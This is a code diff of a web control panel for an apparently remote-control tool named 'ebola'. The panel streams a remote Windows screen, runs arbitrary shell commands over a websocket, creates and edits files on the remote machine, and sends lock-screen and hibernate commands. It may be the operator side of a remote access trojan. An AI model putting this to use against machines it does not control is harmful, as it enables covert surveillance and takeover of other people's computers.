@@ -8,8 +8,8 @@
 		<link href="https://cdn.jsdelivr.net/npm/daisyui@4.10.2/dist/full.min.css" rel="stylesheet" type="text/css" />
 		<script src="https://cdn.tailwindcss.com"></script>
 	</head>
-	<body class="h-screen w-screen overflow-hidden">
-		<main class="grid grid-cols-2 grid-rows-[1fr,2fr] h-full w-full p-6 gap-6">
+	<body class="h-screen w-screen overflow-x-hidden">
+		<main class="grid grid-cols-2 grid-rows-[1fr,2fr] h-full max-h-[100dvh] w-full p-6 gap-6">
 			<div class="w-full h-auto col-span-2 flex items-center gap-3">
 				<div class="font-medium text-3xl"><%= ebola.name %></div>
 				<% if (ebola.status === 'online') { %>
@@ -33,54 +33,95 @@
 							<button id="stop-stream" class="btn">Stop Stream</button>
 						</div>
 						<div class="information grid my-auto grid-rows-2 auto-cols-auto grid-flow-col min-h-none min-w-none gap-x-10 gap-y-5">
-							<div class="elapsed flex-1 bg-base-100 overflow-hidden min-w-none rounded-md border-2 border-primary p-4">
+							<div class="elapsed bg-base-100 overflow-hidden min-w-none rounded-md border-2 border-primary p-4">
 								<label>Time Elapsed</label>
 								<span id="minutes">00</span>:<span id="seconds">00</span>
 							</div>
-							<div class="elapsed flex-1 bg-base-100 rounded-md border-2 border-primary p-4">
+							<button class="btn btn-primary" onclick="new_file.showModal()">New File</button>
+							<dialog id="new_file" class="modal">
+								<div class="modal-box w-11/12 max-w-5xl min-h-[80%]">
+									<h3 class="font-bold text-lg">New File</h3>
+									<div class="flex flex-col items-center gap-y-6">
+										<input type="text" placeholder="File Name" class="input input-bordered w-full max-w-xs" />
+										<input type="text" placeholder="File Extension" class="input input-bordered w-full max-w-xs" />
+										<input type="text" placeholder="File Path (example: C:\Folder\ )" class="input input-bordered w-full max-w-xs" />
+
+										<label class="form-control w-[80%]">
+											<div class="label">
+												<span class="label-text">File content</span>
+											</div>
+											<textarea class="textarea textarea-bordered font-mono min-h-[25rem]" placeholder="Enter Content"></textarea>
+										</label>
+									</div>
+									<div class="modal-action flex gap-x-4">
+										<button class="btn btn-primary">Create</button>
+										<form method="dialog">
+											<button class="btn">Close</button>
+										</form>
+									</div>
+								</div>
+							</dialog>
+
+							<div class="elapsed bg-base-100 overflow-hidden min-w-none rounded-md border-2 border-primary p-4">
 								<label>Time Elapsed</label>
 								<span id="minutes">00</span>:<span id="seconds">00</span>
 							</div>
-							<div class="elapsed flex-1 bg-base-100 overflow-hidden min-w-none rounded-md border-2 border-primary p-4">
+							<button class="btn btn-primary" onclick="edit_file.showModal()">Edit File</button>
+							<dialog id="edit_file" class="modal">
+								<div class="modal-box w-11/12 max-w-5xl min-h-[80%]">
+									<h3 class="font-bold text-lg">Edit File</h3>
+									<div class="flex flex-col items-center gap-y-6">
+										<input type="text" placeholder="File Name" class="input input-bordered w-full max-w-xs" />
+										<input type="text" placeholder="File Extension" class="input input-bordered w-full max-w-xs" />
+										<input type="text" placeholder="File Path (example: C:\Folder\t.txt)" class="input input-bordered w-full max-w-xs" />
+
+										<label class="form-control w-[80%]">
+											<div class="label">
+												<span class="label-text">File content</span>
+											</div>
+											<textarea class="textarea textarea-bordered font-mono min-h-[25rem]" placeholder="Enter Content"></textarea>
+										</label>
+									</div>
+									<div class="modal-action flex gap-x-4">
+										<button class="btn btn-primary">Edit</button>
+										<form method="dialog">
+											<button class="btn">Close</button>
+										</form>
+									</div>
+								</div>
+							</dialog>
+
+							<div class="elapsed bg-base-100 overflow-hidden min-w-none rounded-md border-2 border-primary p-4">
 								<label>Time Elapsed</label>
 								<span id="minutes">00</span>:<span id="seconds">00</span>
 							</div>
-							<div class="elapsed flex-1 bg-base-100 overflow-hidden min-w-none rounded-md border-2 border-primary p-4">
+							<button
+								class="btn btn-neutral"
+								onclick="socket.emit('command_input', 'C:\\Windows\\System32\\Rundll32.exe user32.dll,LockWorkStation')">
+								Lock Screen
+							</button>
+
+							<div class="elapsed bg-base-100 overflow-hidden min-w-none rounded-md border-2 border-primary p-4">
 								<label>Time Elapsed</label>
 								<span id="minutes">00</span>:<span id="seconds">00</span>
 							</div>
-							<div class="elapsed flex-1 bg-base-100 overflow-hidden min-w-none rounded-md border-2 border-primary p-4">
-								<label>Time Elapsed</label>
-								<span id="minutes">00</span>:<span id="seconds">00</span>
-							</div>
-							<div class="elapsed flex-1 bg-base-100 rounded-md border-2 border-primary p-4">
-								<label>Time Elapsed</label>
-								<span id="minutes">00</span>:<span id="seconds">00</span>
-							</div>
-							<div class="elapsed flex-1 bg-base-100 overflow-hidden min-w-none rounded-md border-2 border-primary p-4">
-								<label>Time Elapsed</label>
-								<span id="minutes">00</span>:<span id="seconds">00</span>
-							</div>
-							<div class="elapsed flex-1 bg-base-100 overflow-hidden min-w-none rounded-md border-2 border-primary p-4">
-								<label>Time Elapsed</label>
-								<span id="minutes">00</span>:<span id="seconds">00</span>
-							</div>
+							<button class="btn btn-error" onclick="socket.emit('command_input', 'shutdown/h /t 0')">Shut Down (Hibernate)</button>
 						</div>
 					</div>
 				</div>
 			</div>
-			<div class="cmds grid grid-cols-1 grid-rows-[12fr,1fr] gap-3 border-2 border-primary rounded-xl h-full h-full w-full p-3">
-				<div class="log w-full h-full">
-					<div id="command-log" class="font-mono border-[2px] border-neutral rounded-md h-full w-full overflow-y-auto">
-						<p class="flex flex-row"><span class="font-bold">file location:</span> ls</p>
+			<div class="cmds gap-3 border-2 border-primary rounded-xl h-full max-h-[inherit] w-full p-3">
+				<div class="log w-full h-full overflow-x-auto overflow-y-auto">
+					<div id="command-log" class="font-mono border-[2px] px-2 pt-1 border-neutral rounded-md min-h-full w-full overflow-y-auto">
+						<p id="cmd-prompt">
+							<span class="font-bold dir">Loading...</span
+							><input
+								type="text"
+								class="bg-transparent border-none focus:outline-none font-mono w-0"
+								onkeypress="this.style.width = ((this.value.length + 1) * 9) + 'px';"
+								oninput="this.style.width = ((this.value.length + 1) * 9) + 'px';" />
+						</p>
 					</div>
-				</div>
-				<div class="prompt w-full h-full border-neutral rounded-md">
-					<input
-						id="command-input"
-						type="text"
-						placeholder="Enter command here"
-						class="input font-mono input-bordered border-2 border-neutral input-neutral w-full" />
 				</div>
 			</div>
 		</main>
@@ -88,7 +129,7 @@
 		<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
 		<script>
 			//#region socket init
-			const socket = io('http://localhost:4101', { transports: ['websocket'] });
+			const socket = io('http://<%= ebola.host %>:<%= ebola.port %>', { transports: ['websocket'] });
 
 			document.addEventListener('DOMContentLoaded', event => {
 				let counter = 0;
@@ -111,7 +152,7 @@
 				await changeStatus('online');
 			});
 
-			socket.on('stream-data', data => {
+			socket.on('stream_data', data => {
 				document.getElementById('stream').setAttribute('src', `data:image/png;base64,${data}`);
 
 				if (document.getElementById('stream').style.display !== 'flex') {
@@ -128,7 +169,7 @@
 
 				const data = { status: status };
 
-				await fetch('http://localhost:4100/control/wence', {
+				await fetch('http://localhost:4100/control/<%= ebola.name %>', {
 					method: 'POST',
 					body: JSON.stringify(data),
 					headers: {
@@ -192,13 +233,60 @@
 
 			//#region commands
 			const commandLog = document.getElementById('command-log');
-			const commandInput = document.getElementById('command-input');
+			let workingDir = 'Loading...';
 
-			commandInput.addEventListener('submit', event => {
-				const command = commandInput.value;
-
-				commandInput.value = '';
+			commandLog.addEventListener('click', () => {
+				commandLog.querySelector('#cmd-prompt:last-child input').focus();
 			});
+
+			commandLog.addEventListener('keypress', event => {
+				if (event.key === 'Enter') {
+					if (event.target.value === 'clear' || event.target.value === 'cls') {
+						commandLog.innerHTML = `<p id="cmd-prompt"><span class="font-bold dir">${workingDir}></span><input type="text" class="bg-transparent border-none focus:outline-none font-mono w-0" onkeypress="this.style.width = ((this.value.length + 1) * 9) + 'px';" oninput="this.style.width = ((this.value.length + 1) * 9) + 'px';" /></p>`;
+					} else {
+						let command = commandLog.querySelector('#cmd-prompt:last-child input').value;
+						if (command.startsWith('s32')) command = command.replace('s32', 'C:\\Windows\\System32');
+
+						socket.emit('command_input', command);
+					}
+					commandLog.querySelector('#cmd-prompt:last-child input').focus();
+				}
+			});
+
+			socket.on('command_dir', dir => {
+				workingDir = dir;
+				document.querySelector('#command-log p:last-child span.dir').textContent = workingDir + '>';
+			});
+
+			socket.on('command_output', output => {
+				if (output.trim().length >= 1) {
+					console.log(`output normal: ${output}`);
+					const re = /<(\w+)>/gm;
+					const replacement = '< $1 >';
+					output = output.replace(re, replacement);
+
+					commandLog.querySelector('#cmd-prompt input').defaultValue = commandLog.querySelector('#cmd-prompt input').value;
+					commandLog.innerHTML += `<p><span>${output.split('\n').join('<br>')}</span></p>`;
+					commandLog.innerHTML += `<p id="cmd-prompt"><span class="font-bold dir">${workingDir}></span><input type="text" class="bg-transparent border-none focus:outline-none font-mono w-0" onkeypress="this.style.width = ((this.value.length + 1) * 9) + 'px';" oninput="this.style.width = ((this.value.length + 1) * 9) + 'px';"/></p>`;
+					commandLog.querySelector('#cmd-prompt:last-child input').focus();
+				}
+			});
+			socket.on('command_output_error', output => {
+				if (output.trim().length >= 1) {
+					console.log(`output error: ${output}`);
+					const re = /<(\w+)>/gm;
+					const replacement = '< $1 >';
+					output = output.replace(re, replacement);
+
+					commandLog.querySelector('#cmd-prompt input').defaultValue = commandLog.querySelector('#cmd-prompt input').value;
+					commandLog.innerHTML += `<p><span class="text-red-500">${output.split('\n').join('<br>')}</span></p>`;
+					commandLog.innerHTML += `<p id="cmd-prompt"><span class="font-bold dir">${workingDir}></span><input type="text" class="bg-transparent border-none focus:outline-none font-mono w-0" onkeypress="this.style.width = ((this.value.length + 1) * 9) + 'px';" oninput="this.style.width = ((this.value.length + 1) * 9) + 'px';" /></p>`;
+					commandLog.querySelector('#cmd-prompt:last-child input').focus();
+				}
+			});
+			//#endregion
+
+			//#region misc
 			//#endregion
 		</script>
 	</body>
